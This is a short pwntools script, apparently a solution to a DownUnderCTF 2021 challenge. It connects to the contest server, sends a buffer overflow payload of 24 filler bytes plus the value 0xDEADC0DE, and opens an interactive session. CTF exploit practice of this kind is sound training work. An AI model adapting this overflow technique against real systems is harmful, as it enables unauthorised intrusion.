from pwn import *

r = remote("pwn-2021.duc.tf",31916)

payload = "A"*24 + p64(0xDEADC0DE)

r.sendline(payload)
r.interactive()
